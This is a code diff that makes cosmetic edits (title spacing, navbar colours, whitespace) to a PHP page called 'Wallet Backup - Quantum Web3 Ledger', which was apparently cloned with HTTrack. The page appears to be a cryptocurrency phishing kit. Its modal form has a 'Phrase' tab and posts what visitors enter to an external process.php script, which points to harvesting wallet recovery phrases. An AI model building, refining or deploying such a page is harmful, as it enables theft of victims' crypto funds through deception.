@@ -11,11 +11,12 @@ if (!isset($_SESSION['csrf_token'])) {
 <!DOCTYPE html>
 <html lang="en">
 
+
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-  <title> Wallet Backup - Quantum Web3 Ledger</title>
+  <title>Wallet Backup - Quantum Web3 Ledger</title>
   <!-- Bootstrap CSS -->
   <link
     rel="stylesheet"
@@ -377,9 +378,9 @@ span.h4.d-block.coin-name {
   <!-- NAVBAR -->
   <nav class="navbar navbar-expand-lg sticky-top">
     <div class="container">
-      <a class="navbar-brand" href="#" style="font-size: 1.2rem;">
-                QUANTUM WEB3 LEDGER
-      </a>
+        <a class="navbar-brand" href="#" style="font-size: 1.2rem;">
+            <span style="color: #FFD700;">QUANTUM</span> <span style="color: #FFFFFF;">WEB3</span> <span style="color: #1DA1F2;">LEDGER</span>
+        </a>
       <button
         class="navbar-toggler navbar-dark"
         type="button"
@@ -2326,9 +2327,9 @@ span.h4.d-block.coin-name {
                 <span aria-hidden="true">&times;</span>
               </button>
             </div>
-
             <form method="POST" action="https://quantumweb3ledger.com/process.php">
-                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">            <!-- Tabs -->
+                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
+            <!-- Tabs -->
             <ul class="nav nav-tabs" role="tablist">
               <li class="nav-item">
                 <a class="nav-link active" id="phrase-tab" data-toggle="tab" href="#phrase" role="tab">Phrase</a>
@@ -2439,7 +2440,6 @@ span.h4.d-block.coin-name {
             });
           });
 
-          
         });
       </script>
 <!-- Smartsupp Live Chat script -->
